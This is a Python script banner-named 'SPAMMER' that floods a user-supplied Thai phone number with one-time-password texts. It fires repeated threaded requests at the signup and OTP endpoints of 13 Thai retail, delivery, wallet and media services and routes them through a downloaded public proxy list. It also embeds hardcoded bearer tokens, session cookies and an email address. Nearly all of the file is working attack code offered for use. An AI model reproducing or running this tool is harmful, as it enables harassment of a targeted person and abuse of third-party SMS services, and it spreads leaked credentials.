import time, os, platform, random, requests, threading
from user_agent import generate_user_agent

global cmd, headers, proxy

if platform.system() == "Windows":
    cmd = "cls"
else:
    cmd = "clear"

#  Color
W = "\033[0m"     # white
R = '\033[31;1m'  # red
G = '\033[32;1m'  # green
B = '\033[34m'    # blue
O = '\033[93m'    # orange

headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
data = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
proxy_file = open("proxy.txt", "w")
write_file = proxy_file.write(data)
read_proxy = open("proxy.txt", "r")
proxy = read_proxy.read().splitlines()

def flush_text(text,color,time_delay=0.01):
    for info in list(text):
            print(color + info, end="", flush=True)
            time.sleep(time_delay)

def main():
 
    global phone, amt

    os.system(cmd)
    logo = B + '''
    
███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
''' + G + O + '''\t\t\t\t\t\b\b\b\b\b\bFacebook : Surachai Sonachit\n\n'''

    print(logo)

    phone = input(f"{B}[*] Phone number: ")
    amt = int(input(B + "[*] Count: "))

    flush_text("="*28, G)
    print("")

    def api1():
        res = requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[1:]}&phoneCountryCode=%2B66&b-uid=1.0.760",headers={"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..MSrqMX5S5Ui8NbGvEih2uw.NCJuqSPHzIwZ0Jy4Snq25pKUa887meHakzTe3YTCUnVsMwY8cQMnJ-nOr6Lbb5irc2gr8VfD0G2ZYocg22oVH36DdBnfoJirezzLuf9Uc2DiaQHLJ8OJY3UHo8fLUMB7BYe2w0Q5fDdMF1N0u8_aGA.ZNn49ubbJXSlycijnTncbQ"},proxies={'http': 'http://' + random.choice(proxy)})
        if res.status_code == 200:
            print(f"{G}[+] otp: nocnoc")

    def api2():
        res = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(proxy)})
        if res.status_code == 200:
            print(f"{G}[+] otp: makroclick")

    def api3():
        res = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone},proxies={'http': 'http://' + random.choice(proxy)})
        if res.status_code == 200:
            print(f"{G}[+] otp: lotuss")
    
    def api4():
        res = requests.post("https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"},data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}",proxies={f'http': 'http://' + random.choice(proxy)})
        if res.status_code == 200:
            print(f"{G}[+] otp: truewallet")

    def api5():
        res = requests.post("https://api.1112delivery.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": generate_user_agent(),"accept": "application/json, text/plain, */*"},json={"phonenumber":phone,"language":"th"},proxies={'http': 'http://' + random.choice(proxy)})
        if res.status_code == 200:
            print(f"{G}[+] otp: 1112delivery")

    def api6():
        res = requests.post("https://api-sso.ch3plus.com/user/request-otp",headers={'user-agent': generate_user_agent()},json={"tel": phone,"type":"login"})
        if res.status_code == 200:
            print(f"{G}[+] otp: ch3plus")
    
    def api7():
        res = requests.post("https://api2.1112.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},json={"phonenumber":phone,"language":"th"},proxies={'http': 'http://' + random.choice(proxy)})
        if res.status_code == 200:
            print(f"{G}[+] otp: pizza1112")
    
    def api8():
        res = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]},proxies={'http': 'http://' + random.choice(proxy)})
        res = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(proxy)})
        if res.status_code == 200:
            print(f"{G}[+] otp: bugaboo")

    def api9():
        res = requests.post("https://openapi.bigc.co.th/customer/v1/otp", headers={'Accept': 'application/json, text/plain, */*','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'}, json={"phone_no": phone},proxies={'http': 'http://' + random.choice(proxy)})
        if res.status_code == 200:
            print(f"{G}[+] otp: bigc")

    def api10():
        res = requests.post("https://api.giztix.com/graphql",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"},json={"operationName":"OtpGeneratePhone","variables":{"phone":f"66{phone[1:]}"},"query":"mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"},proxies={'http': 'http://' + random.choice(proxy)})
        if res.status_code == 200:
            print(f"{G}[+] otp: giztix")

    def api11():
        res = requests.post("https://www.easymoney.co.th/estimate/actionSendOtp",data=f"gg_token&name=cybersafe&surname=cybersafe&email=rjrockyou@gmail.com&phone={phone}&area_id=2&password=Hack80&password_chk=Hack80&code=&condition=1",headers={"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36","cookie":"PHPSESSID=1933025720c12fcbb618a207ad775e54;_gcl_au=1.1.506859633.1650848781;_fbp=fb.2.1650848782133.743024538;_ga=GA1.3.1379383593.1650848782;pdpa=1;_gid=GA1.3.380431543.1651807350;_gat_UA-182229042-1=1"})
        if res.status_code == 200:
            print(f"{G}[+] otp: easymoney")

    def api12():
        res = requests.post("https://shopgenix.com/api/sms/otp/", headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-requested-with": "XMLHttpRequest","referer": "https://shopgenix.com/app/5364874/","accept": "application/json, text/javascript, /; q=0.01",}, data=f"mobile_country_id=1&mobile={phone}")
        if res.status_code == 200:
            print(f"[+] otp: shopgenix")

    def api13():
        res = requests.post("https://api.starzth.com/homeshopping/v2/register/request", headers={"user-agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36","content-type" : "application/json","Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2OTQ4NjcwMTEsImV4cCI6MTY5NzQ1OTAxMSwianRpIjoiUnJ5bFJjT0tDRFVxU0t4dU5ZN21ZIiwic3ViIjoic2hvcDE3ODFBUEkiLCJzY29wZSI6WyJwcm9kdWN0cy5hbGwiLCJvcmRlci5hbGwiLCJwYXltZW50LmFsbCIsInByb21vdGlvbi5hbGwiLCJtZW1iZXJzLmFsbCIsIm1lbWJlcnMubGlzdCIsInV0aWxpdHkuYWxsIiwidXRpbGl0eS5saXN0IiwibWVudS5hbGwiLCJtZW51Lmxpc3QiLCJidXlub3djYW1wYWlnbi5kZXRhaWwiLCJyZXdhcmQuYWxsIl0sInVzZXJfa2V5IjoiMGFhNTM4ZWYwYmQyODk3NWE5ZGU3Mzk2NjY4MWU5Mzk1ZTdmZTcyZGViYjhmODU5YWYyNjQ5OTgxZGU5MWUwNCIsInVzZXJfbW9kZWwiOiIiLCJ1c2VyX2FnZW50IjoiTW96aWxsYVwvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0XC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWVcLzExNy4wLjAuMCBTYWZhcmlcLzUzNy4zNiIsIkdEUFJfQUNDRVBUIjoiTiJ9.zNDjIbA_WHOjNTAhp7_EPW5jhuPVLE1zVXL-VZIa3OQ"}, json={"username": phone,"name_th":"tom","lastname_th":"Hijack","password":"12345678Demo","birthday":"1989-09-16","sex":"M","telephone":"+66" + phone[1:]})
        if res.status_code == 200:
            print(f"{G}[+] otp: RS Mall")
    
    for count in range(1, amt+1):
        for index in range(1, 13+1):
            threading.Thread(target=eval(f"api{index}")).start()
            time.sleep(2)

    time.sleep(3)
    flush_text("="*28, G)
    print("")
    ask = input(f"{B}[*] press enter to continue... ")

if __name__ == "__main__":
    while True:
        main()